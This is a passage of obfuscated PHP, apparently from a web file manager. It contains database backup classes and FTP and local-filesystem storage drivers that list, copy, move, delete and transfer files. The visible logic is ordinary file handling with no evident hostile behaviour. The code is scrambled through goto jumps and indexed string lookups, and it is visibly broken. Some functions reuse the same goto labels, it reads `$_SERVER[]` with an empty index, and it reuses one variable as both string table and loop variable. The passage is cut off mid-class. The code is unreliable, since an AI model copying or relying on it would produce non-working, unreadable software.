!0; } if (!isset($dѯ[$e֌[728]]) || $dѯ[$e֌[728]] == $e֌[491]) { $F쐉 = new BackupFile(); if (!$F쐉->index()) { return !1; } } self::set(array($e֌[744] => 1, $e֌[725] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto D; D: $b =& $_SERVER[]; $E = Backup::get(); self::$io = $E[$b[727]]; goto cĲ鬓; F՘: return !0; goto d㰇ǿ; B: foreach ($C as $b) { $d = $d . $b . $b[753]; $Cϖ = null; if ($b == $b[754] && (!isset($E[$b[728]]) || $E[$b[728]] == $b[491])) { $Cϖ = self::$io; } $f += $e򸛉->sqlFromDb($b, $d, $b, $Cϖ); } if (isset($b->task[$b[755]])) { $aůݝ = $b->task[$b[755]] ? $b->task[$b[755]] : timeFloat(); $b܆ = $aůݝ - $b->task[$b[756]]; if ($b܆ >= 0.2) { $Eߓ += 1; } } $b->end(); goto f; B: $e򸛉 = new DbManage($FЗҐڎ, $F듣); $d = TEMP_FILES . $b[745] . self::$name . $b[8]; del_dir($d); goto Fʢ; Fʢ: mk_dir($d); $Eߓ = $f = 0; try { $C = $e򸛉->db()->getTables(); } catch (Exception $a╋) { return !1; } goto d; f: $fȄ = array($b[757] => $F듣, $b[742] => 1, $b[758] => $Eߓ, $b[759] => $f); Backup::set($fȄ); if ($Eߓ > $f) { return !1; } goto F՘; d: $C = array_diff($C, array($b[746], $b[747])); foreach ($C as $b) { $Eߓ += $e򸛉->model($b)->count(); } $b = new Task($b[748], $b[749], $Eߓ, LNG($b[750]) . $b[751] . LNG($b[752])); goto B; cĲ鬓: self::$name = $E[$b[28]]; $FЗҐڎ = $GLOBALS[$b[6]][$b[17]]; $F듣 = $this->_dbType($FЗҐڎ); goto B; d㰇ǿ: } private function _dbType($Bᯤ̕) { goto Aݵ; b͐: return $fΝ; goto cʯ; Aݵ: $FГ =& $_SERVER[]; $Bᯤ̕ = array_change_key_case($Bᯤ̕); $fΝ = $Bᯤ̕[$FГ[760]]; goto Eԉ; Eԉ: if ($fΝ == $FГ[761]) { $C쫆 = explode($FГ[4], $Bᯤ̕[$FГ[762]]); $fΝ = $C쫆[0]; } $EѺ = array($FГ[763] => $FГ[9], $FГ[764] => $FГ[765]); if (isset($EѺ[$fΝ])) { $fΝ = $EѺ[$fΝ]; } goto b͐; cʯ: } } class BackupDbFile { public function __construct() { } public function index() { goto Aӄ; eه: if (!$d) { return !1; } Backup::set(array($bٰ͑Ү[766] => $d)); $bƢ = new TaskFileTransfer($bٰ͑Ү[767], $bٰ͑Ү[749], count($fʧ), LNG($bٰ͑Ү[750]) . $bٰ͑Ү[434] . LNG($bٰ͑Ү[752]) . $bٰ͑Ү[768]); goto f׾׏; dᏃ: $dϠ쑋 = CONTROLLER_DIR . $bٰ͑Ү[772]; IO::copy($cሱ, $aХ); IO::copy($dϠ쑋, $aХ); goto b޿É; f׾׏: $bƢ->task[$bٰ͑Ү[734]] = $d; foreach ($fȦ[$bٰ͑Ү[73]] as $A܌Ľ) { $d談 = IO::move($A܌Ľ[$bٰ͑Ү[75]], $aХ); if (!$d談) { $bƢ->end(); $BІ = IO::getLastError($bٰ͑Ү[769] . $A܌Ľ[$bٰ͑Ү[75]] . $bٰ͑Ү[770] . $aХ . $bٰ͑Ү[499]); write_log($BІ, $bٰ͑Ү[749]); return !1; } } $cሱ = CONTROLLER_DIR . $bٰ͑Ү[771]; goto dᏃ; b޿É: $bƢ->end(); Backup::set(array($bٰ͑Ү[773] => $d)); return !0; goto fܷ; bγ޺˟: $fȦ = IO::listPath($C); $fʧ = isset($fȦ[$bٰ͑Ү[73]]) ? $fȦ[$bٰ͑Ү[73]] : array(); $d = array_sum(array_column($fʧ, $bٰ͑Ү[77])); goto eه; Bא: $C = TEMP_FILES . "\142\141\x63\153\x75\x70\x5f{$aɴ}\57"; $aХ = "\x7b\151\x6f\72{$A[$bٰ͑Ү[727]]}\175\57\x64\x61\x74\x61\x62\x61\163\x65\57\x62\141\143\153\x75\160\137{$aɴ}\x2f"; if (!($aХ = IO::mkdir($aХ))) { return !1; } goto bγ޺˟; Aӄ: $bٰ͑Ү =& $_SERVER[]; $A = Backup::get(); $aɴ = $A[$bٰ͑Ү[28]]; goto Bא; fܷ: } } goto bյ; d뤚: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($f܈) { parent::__construct(); if (count($f܈) > 0) { $this->_init($f܈); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Aљ) { $CߙԆ =& $_SERVER[]; global $config; $this->appCharset = $config[$CߙԆ[1238]]; $this->systemCharset = $config[$CߙԆ[1239]]; if (isset($Aљ[$CߙԆ[1240]]) && $Aљ[$CߙԆ[1240]]) { $this->systemCharset = $Aљ[$CߙԆ[1240]]; } } public function iconvApp($cư) { return $this->iconvTo($cư, $this->systemCharset, $this->appCharset); } public function iconvSystem($D˺) { return $this->iconvTo($D˺, $this->appCharset, $this->systemCharset); } public function getPathOuter($dԼ) { goto cڿՅ; C: return $this->pathDriver . $c[8] . ltrim($dԼ, $c[8]); goto CѮ; cڿՅ: $c =& $_SERVER[]; $BՓ = $this->iconvApp($this->pathBase); $dԼ = $this->iconvApp($dԼ); goto f; f: if (substr($BՓ, 0, 2) == $c[1241]) { $BՓ = BASIC_PATH . substr($BՓ, 2); } if (substr($dԼ, 0, 2) == $c[1241]) { $dԼ = BASIC_PATH . substr($dԼ, 2); } $BՓ = KodIO::clear($BՓ); goto dϋ; dϋ: $dԼ = KodIO::clear($dԼ); $dԼ = substr($dԼ, strlen($BՓ)); if (empty($this->pathDriver)) { return $dԼ; } goto C; CѮ: } private function _init($d = array()) { $B =& $_SERVER[]; if (!function_exists($B[1242])) { throw new Exception(LNG($B[1243])); } $this->config = $d; $this->charsetReset($d); foreach ($d as $Aޜ => $eӡ) { if (isset($this->{$Aޜ})) { $this->{$Aޜ} = $eӡ; } } return $this->_login($d); } private function _login($Cؚ) { goto e; cȠ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $E = @ftp_login($this->connect, $this->username, $this->userpass); goto Cǂ; e: $d =& $_SERVER[]; static $a՝Ӫ = array(); $C퇨ྜྷ = md5(json_encode($Cؚ)); goto d; B: $a՝Ӫ[$C퇨ྜྷ] = array($d[1247] => $this->connect, $d[175] => $this->host, $d[174] => $this->scheme, $d[176] => $this->port); return $E; goto eȎʤ; aɂ¬: $Aţ = isset($A[$d[174]]) && $A[$d[174]] == $d[1244] ? !0 : !1; $this->scheme = $Aţ ? $d[1245] : $d[1246]; $this->port = isset($A[$d[176]]) ? $A[$d[176]] : 21; goto cȠ; Cǂ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $C = $this->pasv == $d[86] ? !0 : !1; @ftp_pasv($this->connect, $C); goto B; d: if (isset($a՝Ӫ[$C퇨ྜྷ])) { foreach ($a՝Ӫ[$C퇨ྜྷ] as $cآ => $Eӳ) { $this->{$cآ} = $Eӳ; } return !0; } $A = parse_url(trim($this->server, $d[8])); $this->host = $A[$d[175]]; goto aɂ¬; eȎʤ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($cј, $F = '', $d᱅ = REPEAT_RENAME) { if ($this->setContent($cј, $F)) { return $this->getPathOuter($cј); } return !1; } public function mkdir($E, $DՔǚ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $E = $this->iconvSystem($E); if ($this->_isFolder($E) || @ftp_mkdir($this->connect, $E)) { return $this->getPathOuter($E); } if (!$this->mkdir($this->pathFather($E))) { return !1; } if ($E = @ftp_mkdir($this->connect, $E)) { return $this->getPathOuter($E); } return !1; } public function copyFile($BҐ, $b) { goto bѸܮ; aڥ澨: $this->tempFileRemve($f); return $e֊ۿ; goto eİ; bѸܮ: if (!$this->_isconn()) { return !1; } $CŐ = $this->pathThis($this->iconvSystem($BҐ)); $f = $this->tempFile($CŐ); goto eʦ冩; eʦ冩: $E = $this->iconvApp($f); $this->download($BҐ, $E); $e֊ۿ = $this->upload($b, $E); goto aڥ澨; eİ: } public function moveFile($B䥈Ѽ, $C) { if (!$this->_isconn()) { return !1; } $B䥈Ѽ = $this->iconvSystem($B䥈Ѽ); $C = $this->iconvSystem($C); $F٠س = @ftp_rename($this->connect, $B䥈Ѽ, $C); return $F٠س ? $this->getPathOuter($C) : !1; } public function delFile($Dը) { if (!$this->_isconn()) { return !1; } $Dը = $this->iconvSystem($Dը); return @ftp_delete($this->connect, $Dը); } public function delFolder($D҉) { goto eƈ; AՏ: $this->fileList($D҉, $aꐝҨ, $bЏ̜, !0); $this->listItemCache = !0; foreach ($bЏ̜ as $A) { $B󊤝 = $this->iconvSystem($A[$_SERVER[][28]]); $Ḏ = @ftp_delete($this->connect, $B󊤝); if (!$Ḏ) { return !1; } } goto a; a: foreach ($aꐝҨ as $B󊤝) { $B󊤝 = $this->iconvSystem($B󊤝); $Ḏ = @ftp_rmdir($this->connect, $B󊤝); if (!$Ḏ) { return !1; } } $D҉ = $this->iconvSystem($D҉); return @ftp_rmdir($this->connect, $D҉); goto D߮; eƈ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $aꐝҨ = $bЏ̜ = array(); goto AՏ; D߮: } public function rename($E, $Bܳޗ) { goto aச; E: return $A낙 ? $this->getPathOuter($aۉ) : !1; goto C; dބ: $aۉ = rtrim($aħ, $Aؿ[8]) . $Aؿ[8] . $D; $A낙 = @ftp_rename($this->connect, $E, $aۉ); $aۉ = $this->iconvApp($aۉ); goto E; Cᢑ: $D = $this->iconvSystem($D); $E = $this->iconvSystem($E); $aħ = $this->pathFather($E); goto dބ; aச: $Aؿ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $D = $this->fileNameAuto($this->pathFather($E), $Bܳޗ); goto Cᢑ; C: } private function folderInfo($d, $f㝊 = false) { $Dθ =& $_SERVER[]; $C = array($Dθ[28] => $this->pathThis($d), $Dθ[75] => $this->getPathOuter($Dθ[8] . $d), $Dθ[29] => $Dθ[76]); if ($f㝊) { return $C; } $C[$Dθ[192]] = $C[$Dθ[83]] = 0; $C[$Dθ[193]] = $C[$Dθ[194]] = !0; return $C; } private function fileInfo($Fı, $a = false, $e㉣ = array()) { goto cצ; F燘: $EŨ[$fԗّ[192]] = $EŨ[$fԗّ[83]] = 0; $EŨ[$fԗّ[193]] = $EŨ[$fԗّ[194]] = !0; $D⪦䦐 = $this->iconvSystem($Fı); goto aϪ; Cȟ: return $EŨ; goto aӮ; aϪ: $EŨ[$fԗّ[83]] = @ftp_mdtm($this->connect, $D⪦䦐); if (empty($e㉣)) { $e㉣ = $this->objectMeta($Fı); if (!$e㉣) { return $EŨ; } } $EŨ[$fԗّ[77]] = $e㉣[$fԗّ[77]]; goto Cȟ; cצ: $fԗّ =& $_SERVER[]; $EŨ = array($fԗّ[28] => $this->pathThis($Fı), $fԗّ[75] => $this->getPathOuter($fԗّ[8] . $Fı), $fԗّ[29] => $fԗّ[173], $fԗّ[77] => isset($e㉣[$fԗّ[77]]) ? $e㉣[$fԗّ[77]] : 0, $fԗّ[167] => $this->ext($Fı)); if ($a) { return $EŨ; } goto F燘; aӮ: } public function size($eՄ¶) { $fܶҎ = $this->objectMeta($eՄ¶); return $fܶҎ ? $fܶҎ[$_SERVER[][77]] : 0; } public function info($E돴) { if ($this->isFile($E돴)) { return $this->fileInfo($E돴, 0); } else { if ($this->isFolder($E돴)) { return $this->folderInfo($E돴); } } return !1; } private function fileList($F, &$E阬, &$AƑ, $fɻߓ = false) { goto f𳅡; Cۑ: $fĮ = $this->listItemCache === !1 ? !1 : !0; $d = @ftp_rawlist($this->connect, $F); if (!$d) { $d = array(); } goto Cߞ; f𳅡: $a =& $_SERVER[]; $F = $this->iconvSystem($F); if (!$this->isFolder($F)) { return !1; } goto dֈ; dֈ: @ftp_chdir($this->connect, $a[8]); $F = rtrim($F, $a[8]) . $a[8]; check_abort(); goto Cۑ; Cߞ: $dҧԧ = array($a[94] => 1, $a[1248] => 1); foreach ($d as $A񗳓) { goto c׆; c׆: $D = $this->_listItem($A񗳓); if ($D[0] == $a[731]) { continue; } $d = $D[8]; goto e; e: if (!$d || isset($dҧԧ[$d])) { continue; } $d = $this->iconvApp($F . ltrim($d, $a[8])); $F = array($a[28] => $d, $a[29] => $a[173], $a[77] => $D[4]); goto B鮞ی; E⧋: if ($Cը) { $E阬[] = $d; if ($fɻߓ) { $this->fileList($d, $E阬, $AƑ, $fɻߓ); } continue; } $AƑ[] = $F; goto cҖ; B鮞ی: if (substr($A񗳓, 0, 1) == $a[1249]) { $F[$a[29]] = $a[76]; $F[$a[77]] = 0; } $Cը = $F[$a[29]] == $a[76] ? !0 : !1; if ($fĮ) { $this->cacheMethod($a[197], $d, $Cը); $this->cacheMethod($a[198], $d, $F); } goto E⧋; cҖ: } if ($fĮ) { $this->cacheMethod($a[197], $F, !0); } goto dَ; dَ: } private function _listItem($Fĳ) { if (empty($Fĳ)) { return array(); } $f = preg_split($_SERVER[][1250], $Fĳ); if (count($f) <= 9) { return $f; } $f[8] = trim(substr($Fĳ, strpos($Fĳ, $f[7]) + strlen($f[7]))); return array_splice($f, 0, 9); } public function listPath($aؕ, $E׉ = false) { goto Fϑ; f: $this->fileList($aؕ, $d°ٚ, $E); foreach ($d°ٚ as $bɽד => $dʦ) { $d°ٚ[$bɽד] = $this->folderInfo($dʦ, $E׉); } foreach ($E as $bɽד => $dʦ) { $E[$bɽד] = $this->fileInfo($dʦ[$b֮[28]], $E׉, $dʦ); } goto f; f: return array($b֮[74] => $d°ٚ, $b֮[73] => $E); goto d̋; Fϑ: $b֮ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $d°ٚ = $E = array(); goto f; d̋: } public function has($Fͩ, $Cم = false, $Dۂ = true) { goto A; A: $cÊʆ =& $_SERVER[]; $b = $BѤ = array(); $bߑ = $Cم ? !0 : !1; goto E; E: $this->fileList($Fͩ, $b, $BѤ, $bߑ); if ($Cم) { return array($cÊʆ[201] => count($BѤ), $cÊʆ[202] => count($b)); } if ($Dۂ) { if (count($BѤ)) { return !0; } } else { if (count($b)) { return !0; } } goto bܹח; bܹח: return !1; goto f; f: } public function listAll($d蓮Ў) { goto a膌; a膌: $Fș =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $Aㅯ = $f葒 = array(); goto Aꗇ̹; CÊ: foreach ($Aㅯ as $Cߓ) { if (is_string($Cߓ)) { $c[$Cߓ] = 0; } } return $this->listAllFiles($d蓮Ў, array_keys($c), $c); goto Cͯ֒; Aꗇ̹: $this->fileList($d蓮Ў, $Aㅯ, $f葒, !0); $c = array(); foreach ($f葒 as $Cߓ) { $c[$Cߓ[$Fș[28]]] = $Cߓ[$Fș[77]]; } goto CÊ; Cͯ֒: } public function getContent($A㜈) { if (!$this->_isconn()) { return !1; } $A㜈 = $this->iconvSystem($A㜈); return $this->fileSubstr($A㜈); } public function setContent($B, $Eܚӱ = '') { goto A; e: file_put_contents($eǃ, $Eܚӱ); $F = $this->upload($B, $this->iconvApp($eǃ)); $this->tempFileRemve($eǃ); goto EՏ; A: if (!$this->_isconn()) { return !1; } $CՊ = $this->pathThis($this->iconvSystem($B)); $eǃ = $this->tempFile($CՊ); goto e; EՏ: return $F; goto aͰ; aͰ: } public function fileSubstr($Cɋ˵̿, $d = 0, $d֌ݴ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Cɋ˵̿, $d, $d֌ݴ); } private function ftpRequest($bɝ, $Cɐ = 0, $Dه = false) { goto cڭ; a合: curl_setopt($F񟸊, CURLOPT_RETURNTRANSFER, 1); $FхҨ = curl_exec($F񟸊); curl_close($F񟸊); goto fǽ垨; cڭ: $bɝ = $this->iconvSystem($bɝ); $AΧ = $this->scheme . $this->host . $_SERVER[][4] . $this->port; $F񟸊 = curl_init(); goto bìݗ; fǽ垨: return $FхҨ; goto C瘞; bìݗ: curl_setopt($F񟸊, CURLOPT_URL, $AΧ . $this->pathEncode($bɝ)); curl_setopt($F񟸊, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Dه) { $D = $Cɐ + $Dه - 1; curl_setopt($F񟸊, CURLOPT_RANGE, "{$Cɐ}\55{$D}"); } goto a合; C瘞: } public function upload($E昖, $dם, $A揅 = false, $c˝ = REPEAT_REPLACE) { goto B; Eя: if ($A != FTP_FINISHED) { return !1; } return $this->getPathOuter($E昖); goto a; d: $dם = $this->iconvSystem($dם); $A = ftp_nb_put($this->connect, $E昖, $dם, FTP_BINARY); while ($A == FTP_MOREDATA) { $A = ftp_nb_continue($this->connect); } goto Eя; B: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($E昖))) { return !1; } $E昖 = $this->iconvSystem($E昖); goto d; a: } public function download($d, $f = '') { goto d䷕; C: while ($B == FTP_MOREDATA) { $B = ftp_nb_continue($this->connect); } if ($B != FTP_FINISHED) { return !1; } return $this->iconvApp($f); goto fĪ; b嵷ƫ: $d = $this->iconvSystem($d); $f = $this->iconvSystem($f); $B = ftp_nb_get($this->connect, $f, $d, FTP_BINARY); goto C; d䷕: if (!$this->_isconn()) { return !1; } $Fێ = $this->pathFather($f); if (!IO::mkdir($Fێ)) { return !1; } goto b嵷ƫ; fĪ: } public function exist($dჟ) { return $this->isFile($dჟ) || $this->isFolder($dჟ); } public function isFile($Fɦ) { return !$this->isFolder($Fɦ) && $this->objectMeta($Fɦ); } public function isFolder($C敐ŋ) { return $this->cacheMethod($_SERVER[][197], $C敐ŋ); } protected function objectMeta($eҰؑΟ) { return $this->cacheMethod($_SERVER[][198], $eҰؑΟ); } protected function _objectMeta($eτħ) { goto bυ; D: $cσ = @ftp_size($this->connect, $eτħ); if ($cσ != -1) { $Eë[$eڦ[77]] = $cσ; } else { $a = @ftp_chdir($this->connect, $eτħ); if (!$a) { return !1; } $Eë[$eڦ[29]] = $eڦ[76]; } return $Eë; goto bۭ; bυ: $eڦ =& $_SERVER[]; if ($eτħ == $eڦ[33] || $eτħ == $eڦ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto E؍; E؍: $eτħ = $this->iconvSystem($eτħ); $Eë = array($eڦ[28] => $this->iconvApp($eτħ), $eڦ[29] => $eڦ[173], $eڦ[77] => 0); @ftp_chdir($this->connect, $eڦ[8]); goto D; bۭ: } protected function _isFolder($f텨ͅ) { $C =& $_SERVER[]; if ($f텨ͅ == $C[33] || $f텨ͅ == $C[8]) { return !0; } $Cùߥ = $this->_objectMeta($f텨ͅ); return isset($Cùߥ[$C[29]]) && $Cùߥ[$C[29]] == $C[76] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($Bꔎ) { if (substr($Bꔎ, 0, 2) == $_SERVER[][1241]) { $Bꔎ = BASIC_PATH . substr($Bꔎ, 2); } return $Bꔎ; } public function iconvApp($aħ) { $d =& $_SERVER[]; global $config; return $this->iconvTo($aħ, $config[$d[1239]], $config[$d[1238]]); } public function iconvSystem($A) { $Cɢ =& $_SERVER[]; global $config; return $this->iconvTo($A, $config[$Cɢ[1238]], $config[$Cɢ[1239]]); } public function getPathOuter($A) { goto b; Bʗ: $A = KodIO::clear($A); $A = substr($A, strlen($a؈)); if (empty($this->pathDriver)) { return $A; } goto b; b: $c̹ =& $_SERVER[]; $a؈ = $this->iconvApp($this->pathBase); $A = $this->iconvApp($A); goto D; b: return $this->pathDriver . $c̹[8] . ltrim($A, $c̹[8]); goto Dьɑ; D: if (substr($a؈, 0, 2) == $c̹[1241]) { $a؈ = BASIC_PATH . substr($a؈, 2); } if (substr($A, 0, 2) == $c̹[1241]) { $A = BASIC_PATH . substr($A, 2); } $a؈ = KodIO::clear($a؈); goto Bʗ; Dьɑ: } public function mkfile($E, $EŲا = '', $Cⵚ = REPEAT_RENAME) { $E = $this->iconvSystem($E); @touch($E); if ($EŲا) { file_put_contents($E, $EŲا); } return is_file($E) ? $this->getPathOuter($E) : !1; } public function mkdir($aڐ, $Fꍕ = REPEAT_SKIP) { $aڐ = $this->iconvSystem($aڐ); if (is_dir($aڐ)) { return $this->getPathOuter($aڐ); } @mkdir($aڐ, 511, !0); return is_dir($aڐ) ? $this->getPathOuter($aڐ) : !1; } public function copyFile($EΥü, $Aګ) { $this->mkdir($this->pathFather($Aګ)); $EΥü = $this->iconvSystem($EΥü); $Aګ = $this->iconvSystem($Aګ); $DȽ = copy_64($EΥü, $Aګ); return $DȽ ? $this->getPathOuter($Aګ) : !1; } public function moveFile($Fٜ, $d) { $this->mkdir($this->pathFather($d)); $Fٜ = $this->iconvSystem($Fٜ); $d = $this->iconvSystem($d); $Bꖊƒ = intval(@rename($Fٜ, $d)); if (!$Bꖊƒ) { if ($Bꖊƒ = intval(@copy_64($Fٜ, $d))) { @unlink($Fٜ); } } return $Bꖊƒ ? $this->getPathOuter($d) : !1; } public function delFile($a십) { $a십 = $this->iconvSystem($a십); if (!@unlink($a십)) { @chmod($a십, 511); if (!@unlink($a십)) { return !1; } } else { return !0; } } public function delFolder($C摴) { goto E; CƲ: if (!($aЧ = opendir($C摴))) { return !1; } while (($b͇ = readdir($aЧ)) !== !1) { if ($b͇ == $e택[94] || $b͇ == $e택[1248]) { continue; } $b栏䋃 = $C摴 . $e택[8] . $b͇; if (is_file($b栏䋃) || is_link($b栏䋃)) { if (!unlink($b栏䋃)) { chmod($b栏䋃, 511); if (!unlink($b栏䋃)) { return !1; } } } else { if (is_dir($b栏䋃)) { chmod($b栏䋃, 511); $b栏䋃 = $this->iconvApp($b栏䋃); if (!$this->delFolder($b栏䋃)) { return !1; } } } } closedir($aЧ); goto CĬӂ; CĬӂ: return rmdir($C摴); goto eͽ; E: $e택 =& $_SERVER[]; $C摴 = $this->iconvSystem($C摴); if (!is_dir($C摴)) { return !0; } goto CƲ; eͽ: } public function rename($Cםݶ, $b) { goto Bϐ; eʇ: $Cםݶ = $this->iconvSystem($Cםݶ); $d = $this->pathFather($Cםݶ); $D = rtrim($d, $Fŋ[8]) . $Fŋ[8] . $d܂ш; goto Bٶ; Bٶ: $F΃ = @rename($Cםݶ, $D); $D = $this->iconvApp($D); return $F΃ ? $this->getPathOuter($D) : !1; goto FЪ; Bϐ: $Fŋ =& $_SERVER[]; $d܂ш = $this->fileNameAuto($this->pathFather($Cםݶ), $b); $d܂ш = $this->iconvSystem($d܂ш); goto eʇ; FЪ: } public function size($e䃃) { $e䃃 = $this->iconvSystem($e䃃); return filesize_64($e䃃); } public function info($C) { $C = $this->iconvSystem($C); if ($this->isFolder($C)) { return $this->folderInfo($C); } else { if ($this->isFile($C)) { return $this->fileInfo($C); } } return !1; } protected function infoChildren($f䑙, &$Cţ, $Aݸ = true) { goto a¼; a笻瑱: closedir($CЏ); goto Dϊи; a¼: $AĂϦ =& $_SERVER[]; check_abort_echo(); $f䑙 = rtrim($f䑙, $AĂϦ[8]) . $AĂϦ[8]; goto Dώ; Dώ: if ($Aݸ) { $f䑙 = $this->iconvSystem($f䑙); } if (!($CЏ = @opendir($f䑙))) { return; } while (($Bᗉ = readdir($CЏ)) !== !1) { if ($Bᗉ == $AĂϦ[94] || $Bᗉ == $AĂϦ[1248]) { continue; } $eڎ = $f䑙 . $Bᗉ; if (is_file($eڎ) || is_link($eڎ)) { $Cţ[$AĂϦ[78]]++; $Cţ[$AĂϦ[77]] += filesize_64($eڎ); } else { if (is_dir($eڎ)) { $Cţ[$AĂϦ[79]]++; $this->infoChildren($eڎ, $Cţ, !1); } } } goto a笻瑱; Dϊи: } private function folderInfo($f, $F؃۫ = false) { $E =& $_SERVER[]; $f = rtrim($f, $E[8]) . $E[8]; $D = $this->iconvApp($this->pathThis($f)); if ($F؃۫) { return array($E[28] => $D, $E[75] => $this->getPathOuter($f), $E[29] => $E[76]); } $aƾ = array($E[28] => $D, $E[75] => $this->getPathOuter($f), $E[29] => $E[76], $E[192] => @filectime($f), $E[83] => @filemtime($f), $E[1251] => @fileatime($f), $E[1252] => is_readable($f), $E[1253] => is_writable($f), $E[1254] => get_mode($f)); return $aƾ; } private function fileInfo($Dǽ, $dƆ = false) { $a =& $_SERVER[]; $c܅ = $this->iconvApp($this->pathThis($Dǽ)); if ($dƆ) { return array($a[28] => $c܅, $a[75] => $this->getPathOuter($Dǽ), $a[29] => $a[173], $a[77] => $this->size($Dǽ), $a[167] => $this->ext($c܅)); } $bѺ = array($a[28] => $c܅, $a[75] => $this->getPathOuter($Dǽ), $a[29] => $a[173], $a[192] => @filectime($Dǽ), $a[83] => @filemtime($Dǽ), $a[1251] => @fileatime($Dǽ), $a[77] => $this->size($Dǽ), $a[167] => $this->ext($c܅), $a[1252] => is_readable($Dǽ), $a[1253] => is_writable($Dǽ), $a[1254] => get_mode($Dǽ)); return $bѺ; } public function exist($b) { $b = $this->iconvSystem($b); return @file_exists($b); } public function isFile($eл) { $eл = $this->iconvSystem($eл); return @is_file($eл); } public function isFolder($fЃ) { $fЃ = $this->iconvSystem($fЃ); return @is_dir($fЃ); } public function listPath($cꐪ, $aЅ = false) { goto b¶; eş: $d = array($b[74] => array(), $b[73] => array()); if (!($bŐ = @opendir($cꐪ))) { return $d; } while (($F = readdir($bŐ)) !== !1) { if ($F == $b[94] || $F == $b[1248]) { continue; } $a烨 = $cꐪ . $F; if (is_file($a烨)) { $d[$b[73]][] = $this->fileInfo($a烨, $aЅ); } else { $d[$b[74]][] = $this->folderInfo($a烨, $aЅ); } } goto cȎ; cȎ: closedir($bŐ); return $d; goto Ḇ; b¶: $b =& $_SERVER[]; $cꐪ = $this->iconvSystem($cꐪ); $cꐪ = rtrim($cꐪ, $b[8]) . $b[8]; goto eş; Ḇ: } public function listAll($bŇ, &$aݺ߬ = array()) { goto B볞; F⮄: return $aݺ߬; goto bУϗ; C: if (!($d = @opendir($bŇ))) { return $aݺ߬; } while (($a = readdir($d)) !== !1) { if ($a == $A[94] || $a == $A[1248]) { continue; } $C󤅑 = $bŇ . $a; if (is_dir($C󤅑) && !is_link($C󤅑)) { $aݺ߬[] = array($A[75] => $C󤅑 . $A[8], $A[76] => 1, $A[83] => @filemtime($C󤅑), $A[77] => 0); $this->listAll($C󤅑, $aݺ߬); } else { $aݺ߬[] = array($A[75] => $C󤅑, $A[76] => 0, $A[83] => @filemtime($C󤅑), $A[77] => $this->size($C󤅑)); } } closedir($d); goto F⮄; B볞: $A =& $_SERVER[]; $bŇ = $this->iconvSystem($bŇ); $bŇ = rtrim($bŇ, $A[8]) . $A[8]; goto C; bУϗ: } public function has($Eӱв, $D١ = false, $F = true) { goto Dщ; Cؗۍ: if (!($BΆ = @opendir($Eӱв))) { return !1; } $f図 = 0; $bĨ = 0; goto eߤ; DΏ: if ($D١) { return array($C꟭[201] => $f図, $C꟭[202] => $bĨ); } return !1; goto e݄; Dщ: $C꟭ =& $_SERVER[]; $Eӱв = $this->iconvSystem($Eӱв); $Eӱв = rtrim($Eӱв, $C꟭[8]) . $C꟭[8]; goto Cؗۍ; eߤ: $A̖ = 0; while (($DҎ҈ = readdir($BΆ)) !== !1) { if ($DҎ҈ == $C꟭[94] || $DҎ҈ == $C꟭[1248]) { continue; } $bɷ = $Eӱв . $DҎ҈; if ($D١) { $A̖++; if (@is_file($bɷ)) { $f図++; } else { $bĨ++; } if ($A̖ > 10000) { break; } continue; } if ($F) { if (@is_file($bɷ)) { return !0; } } else { if (@is_dir($bɷ . $C꟭[8])) { return !0; } } } closedir($BΆ); goto DΏ; e݄: } public function hashSimple($cބĘ) { goto f; f: $eČý =& $_SERVER[]; if (!$cބĘ) { return md5($eČý[33]); } $cބĘ = $this->iconvSystem($cބĘ); goto b͘; Cų: if ($bĮӔ <= $a醉 * $Eø) { return $this->hashMd5($cބĘ) . $bĮӔ; } $f = $eČý[33]; $Eͻ = intval($bĮӔ / $Eø); goto EŚ; B: fseek_64($a퉐, $bĮӔ - $a醉); $f .= fread($a퉐, $a醉); fclose($a퉐); goto Cۼ; Cۼ: return md5($f) . $bĮӔ; goto dڒ럣; EŚ: $a퉐 = fopen($cބĘ, $eČý[1255]); if (!$a퉐) { return $f; } for ($dھ = 0; $dھ < $Eø; $dھ++) { fseek_64($a퉐, $Eͻ * $dھ); $f .= fread($a퉐, $a醉); } goto B; b͘: $bĮӔ = $this->size($cބĘ); $a醉 = 200; $Eø = 50; goto Cų; dڒ럣: } public function getContent($Aѽˢ) { $Aѽˢ = $this->iconvSystem($Aѽˢ); return file_get_contents($Aѽˢ); } public function setContent($aԫӄ, $a = '') { $aԫӄ = $this->iconvSystem($aԫӄ); $CĦ = @file_put_contents($aԫӄ, $a, LOCK_EX); clearstatcache(); return $CĦ === !1 ? !1 : !0; } public function fileSubstr($CѴΜ, $A = 0, $fħ = false) { goto ç; eҵ: fseek_64($fßׂ, $A); $Dʪ = fread($fßׂ, $fħ); fclose($fßׂ); goto a; Fԇ׉: if ($fħ <= 0) { return $e[33]; } $fßׂ = fopen($CѴΜ, $e[1255]); if (!$fßׂ) { return !1; } goto eҵ; a: return $Dʪ; goto aŔ; ç: $e =& $_SERVER[]; $CѴΜ = $this->iconvSystem($CѴΜ); if ($fħ === !1) { $fħ = $this->size($CѴΜ); } goto Fԇ׉; aŔ: } public function upload($eښ, $f߭ɒʭ, $cߜ = false, $BĐ = REPEAT_REPLACE) { $A = $this->copyFile($f߭ɒʭ, $eښ); return $A ? $this->getPathOuter($eښ) : !1; } public function setModifyTime($C, $C = '') { @touch($C, intval($C)); } public function download($c􄏪, $c) { return $this->iconvSystem($c􄏪); } } class PathDriverMinIO extends PathDriverBaseS3 { public function 